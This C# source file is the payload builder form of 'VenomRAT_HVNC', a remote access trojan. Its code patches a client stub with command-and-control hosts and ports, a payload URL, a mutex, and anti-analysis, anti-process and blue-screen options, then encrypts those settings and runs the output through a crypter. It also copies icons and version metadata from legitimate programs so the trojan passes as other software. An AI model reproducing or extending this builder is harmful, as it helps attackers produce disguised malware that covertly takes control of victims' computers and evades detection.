using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.WinForms;
using Toolbelt.Drawing;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Helper;
using Vestris.ResourceLib;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormBuilder
    {
        public FormBuilder()
        {
            InitializeComponent();
        }

        private void SaveSettings()
        {
            List<string> list = new List<string>();
            foreach (object obj in YourListPorts.Items)
            {
                string item = (string)obj;
                list.Add(item);
            }


            Properties.Settings.Default.Ports = string.Join(",", list);
            List<string> list2 = new List<string>();
            foreach (object obj2 in YourListIPs.Items)
            {
                string item2 = (string)obj2;
                list2.Add(item2);
            }

            Properties.Settings.Default.IP = string.Join(",", list2);
            Properties.Settings.Default.Save();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = @"ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
                return;
            }

            checkBox1.Text = @"OFF";
            textFilename.Enabled = false;
            comboBoxFolder.Enabled = false;
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            if (Properties.Settings.Default.IP.Length == 0)
            {
                YourListIPs.Items.Add("127.0.0.1");
            }

            if (Properties.Settings.Default.Paste_bin.Length == 0)
            {
                txtPaste_bin.Text = @"Paste Your Payload URL";
            }

            string[] array =
                Properties.Settings.Default.Ports.Split(new[] { "," },
                    StringSplitOptions.None);
            foreach (string text in array)
            {
                if (!string.IsNullOrWhiteSpace(text))
                {
                    YourListPorts.Items.Add(text.Trim());
                }
            }

            string[] array3 =
                Properties.Settings.Default.IP.Split(new[] { "," },
                    StringSplitOptions.None);
            foreach (string text2 in array3)
            {
                if (!string.IsNullOrWhiteSpace(text2))
                {
                    YourListIPs.Items.Add(text2.Trim());
                }
            }

            if (Properties.Settings.Default.Mutex.Length == 0)
            {
                txtMutex.Text = GetRandomCharacters();
            }
        }

        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (chkPaste_bin.Checked)
            {
                txtPaste_bin.Enabled = true;
                textIP.Enabled = false;
                textPort.Enabled = false;
                YourListIPs.Enabled = false;
                YourListPorts.Enabled = false;
                btnAddIP.Enabled = false;
                btnAddPort.Enabled = false;
                btnRemoveIP.Enabled = false;
                btnRemovePort.Enabled = false;
                return;
            }

            txtPaste_bin.Enabled = false;
            textIP.Enabled = true;
            textPort.Enabled = true;
            YourListIPs.Enabled = true;
            YourListPorts.Enabled = true;
            btnAddIP.Enabled = true;
            btnAddPort.Enabled = true;
            btnRemoveIP.Enabled = true;
            btnRemovePort.Enabled = true;
        }

        private void BtnRemovePort_Click(object sender, EventArgs e)
        {
            if (YourListPorts.SelectedItems.Count == 1)
            {
                YourListPorts.Items.Remove(YourListPorts.SelectedItem);
            }
        }

        private void BtnAddPort_Click(object sender, EventArgs e)
        {
            string trimmedText = textPort.Text.Trim();


            if (!Int32.TryParse(trimmedText, out _))
            {
                MessageBox.Show(@"Veuillez entrer un nombre entier valid pour le port");
                return;
            }


            foreach (object obj in YourListPorts.Items)
            {
                string text = (string)obj;
                if (text.Equals(trimmedText))
                {
                    MessageBox.Show(@"Ce port est déjà dans la liste");
                    return;
                }
            }


            YourListPorts.Items.Add(trimmedText);
            textPort.Clear();
        }

        private void BtnRemoveIP_Click(object sender, EventArgs e)
        {
            if (YourListIPs.SelectedItems.Count == 1)
            {
                YourListIPs.Items.Remove(YourListIPs.SelectedItem);
            }
        }

        private void BtnAddIP_Click(object sender, EventArgs e)
        {
            foreach (object obj in YourListIPs.Items)
            {
                string text = (string)obj;
                textIP.Text = textIP.Text.Replace(" ", "");
                if (text.Equals(textIP.Text))
                {
                    return;
                }
            }

            YourListIPs.Items.Add(textIP.Text.Replace(" ", ""));
            textIP.Clear();
        }

        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            if ((chkPaste_bin.Checked || YourListIPs.Items.Count != 0) && YourListPorts.Items.Count != 0)
            {
                if (checkBox1.Checked)
                {
                    if (string.IsNullOrWhiteSpace(textFilename.Text) ||
                        string.IsNullOrWhiteSpace(comboBoxFolder.Text))
                    {
                        return;
                    }

                    if (!textFilename.Text.EndsWith("exe"))
                    {
                        Guna2TextBox guna2TextBox = textFilename;
                        guna2TextBox.Text += @".exe";
                    }
                }

                if (string.IsNullOrWhiteSpace(txtMutex.Text))
                {
                    txtMutex.Text = GetRandomCharacters();
                }

                if (!chkPaste_bin.Checked || !string.IsNullOrWhiteSpace(txtPaste_bin.Text))
                {
                    ModuleDefMD module = null;
                    try
                    {
                        module = ModuleDefMD.Load(File.ReadAllBytes("Stub/Client.exe"));
                        using SaveFileDialog saveFileDialog = new SaveFileDialog();
                        saveFileDialog.Filter = @".exe (*.exe)|*.exe";
                        saveFileDialog.InitialDirectory = Application.StartupPath;
                        saveFileDialog.OverwritePrompt = false;
                        saveFileDialog.FileName = "Protected";
                        if (saveFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            btnBuild.Enabled = false;
                            WriteSettings(module, saveFileDialog.FileName);
                            module.Write(saveFileDialog.FileName);
                            try
                            {
                                await Crypter.Program.Run(saveFileDialog.FileName);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show($@"Error: {ex.Message}", @"Builder", MessageBoxButtons.OK,
                                    MessageBoxIcon.Error);
                                return;
                            }

                            if (btnAssembly.Checked)
                            {
                                WriteAssembly(saveFileDialog.FileName);
                            }

                            if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                            {
                                IconInjector.InjectIcon(saveFileDialog.FileName, txtIcon.Text);
                            }

                            try
                            {
                                //Process.Start(saveFileDialog.FileName);
                            }
                            catch (Win32Exception ex) // Launching a process can throw a Win32Exception
                            {
                                MessageBox.Show($@"Error launching process: {ex.Message}", @"Builder",
                                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }

                            //MessageBox.Show(@"Stub Successfully build!", @"Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                            SaveSettings();
                            Close();
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, @"Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }
                    finally
                    {
                        module?.Dispose();
                        btnBuild.Enabled = true;
                    }
                }
            }
        }

        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);
                versionResource.FileVersion = txtFileVersion.Text;
                versionResource.ProductVersion = txtProductVersion.Text;
                versionResource.Language = 0;
                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txtProduct.Text;
                stringFileInfo["FileDescription"] = txtDescription.Text;
                stringFileInfo["CompanyName"] = txtCompany.Text;
                stringFileInfo["LegalCopyright"] = txtCopyright.Text;
                stringFileInfo["LegalTrademarks"] = txtTrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txtOriginalFilename.Text;
                stringFileInfo["OriginalFilename"] = txtOriginalFilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (btnAssembly.Checked)
            {
                btnClone.Enabled = true;
                txtProduct.Enabled = true;
                txtDescription.Enabled = true;
                txtCompany.Enabled = true;
                txtCopyright.Enabled = true;
                txtTrademarks.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtProductVersion.Enabled = true;
                txtFileVersion.Enabled = true;
                return;
            }

            btnClone.Enabled = false;
            txtProduct.Enabled = false;
            txtDescription.Enabled = false;
            txtCompany.Enabled = false;
            txtCopyright.Enabled = false;
            txtTrademarks.Enabled = false;
            txtOriginalFilename.Enabled = false;
            txtOriginalFilename.Enabled = false;
            txtProductVersion.Enabled = false;
            txtFileVersion.Enabled = false;
        }

        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void BtnIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = @"Choose Icon";
                openFileDialog.Filter = @"Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                openFileDialog.Multiselect = false;
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
                    {
                        string icon = GetIcon(openFileDialog.FileName);
                        txtIcon.Text = icon;
                        picIcon.ImageLocation = icon;
                    }
                    else
                    {
                        txtIcon.Text = openFileDialog.FileName;
                        picIcon.ImageLocation = openFileDialog.FileName;
                    }
                }
            }
        }

        private string GetIcon(string path)
        {
            string text = Path.GetTempFileName() + ".ico";
            using (FileStream fileStream = new FileStream(text, FileMode.Create))
            {
                IconExtractor.Extract1stIconTo(path, fileStream);
            }

            return text;
        }

        private void WriteSettings(ModuleDefMD asmDef, string asmName)
        {
            try
            {
                string randomString = Methods.GetRandomString(32);
                Aes256 aes = new Aes256(randomString);
                X509Certificate2 x509Certificate = new X509Certificate2(
                    Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
                X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
                byte[] inArray;
                using (RSACryptoServiceProvider rsacryptoServiceProvider =
                       (RSACryptoServiceProvider)x509Certificate.PrivateKey)
                {
                    byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
                    inArray = rsacryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
                }

                foreach (TypeDef typeDef in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(asmName);
                    asmDef.Name = Path.GetFileName(asmName);
                    if (typeDef.Name == "Settings")
                    {
                        foreach (MethodDef methodDef in typeDef.Methods)
                        {
                            if (methodDef.Body != null)
                            {
                                for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
                                {
                                    if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                    {
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Ports%")
                                        {
                                            if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
                                            {
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                            }
                                            else
                                            {
                                                List<string> list = new List<string>();
                                                foreach (object obj in YourListPorts.Items)
                                                {
                                                    string item = (string)obj;
                                                    list.Add(item);
                                                }

                                                methodDef.Body.Instructions[i].Operand =
                                                    aes.Encrypt(string.Join(",", list));
                                            }
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Hosts%")
                                        {
                                            if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
                                            {
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                            }
                                            else
                                            {
                                                List<string> list2 = new List<string>();
                                                foreach (object obj2 in YourListIPs.Items)
                                                {
                                                    string item2 = (string)obj2;
                                                    list2.Add(item2);
                                                }

                                                methodDef.Body.Instructions[i].Operand =
                                                    aes.Encrypt(string.Join(",", list2));
                                            }
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Install%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                aes.Encrypt(checkBox1.Checked.ToString().ToLower());
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Folder%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%File%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = textFilename.Text;
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Version%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                aes.Encrypt(
                                                    Settings.Version
                                                        .Replace("DcRat ", ""));
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Key%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%MTX%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Anti%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                aes.Encrypt(chkAnti.Checked.ToString().ToLower());
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Certificate%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                aes.Encrypt(
                                                    Convert.ToBase64String(
                                                        x509Certificate2.Export(X509ContentType.Cert)));
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                aes.Encrypt(Convert.ToBase64String(inArray));
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%BSOD%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                aes.Encrypt(chkBsod.Checked.ToString().ToLower());
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
                                        {
                                            if (chkPaste_bin.Checked)
                                            {
                                                methodDef.Body.Instructions[i].Operand =
                                                    aes.Encrypt(txtPaste_bin.Text);
                                            }
                                            else
                                            {
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                            }
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Delay%")
                                        {
                                            methodDef.Body.Instructions[i].Operand =
                                                numDelay.Value.ToString(CultureInfo.CurrentCulture);
                                        }

                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Group%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

        public string GetRandomCharacters()
        {
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 1; i <= new Random().Next(10, 20); i++)
            {
                int index = Random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
                stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
            }

            return stringBuilder.ToString();
        }

        private void BtnClone_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = @"Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
                    txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
                    txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
                    txtProduct.Text = versionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
                    txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
                    int fileMajorPart = versionInfo.FileMajorPart;
                    txtFileVersion.Text = string.Concat(new[]
                    {
                        versionInfo.FileMajorPart.ToString(),
                        ".",
                        versionInfo.FileMinorPart.ToString(),
                        ".",
                        versionInfo.FileBuildPart.ToString(),
                        ".",
                        versionInfo.FilePrivatePart.ToString()
                    });
                    txtProductVersion.Text = string.Concat(new[]
                    {
                        versionInfo.FileMajorPart.ToString(),
                        ".",
                        versionInfo.FileMinorPart.ToString(),
                        ".",
                        versionInfo.FileBuildPart.ToString(),
                        ".",
                        versionInfo.FilePrivatePart.ToString()
                    });
                }
            }
        }

        private void guna2ShadowPanel1_Paint(object sender, PaintEventArgs e)
        {
        }

        private void guna2ShadowPanel2_Paint(object sender, PaintEventArgs e)
        {
        }

        public readonly Random Random = new Random();
    }
}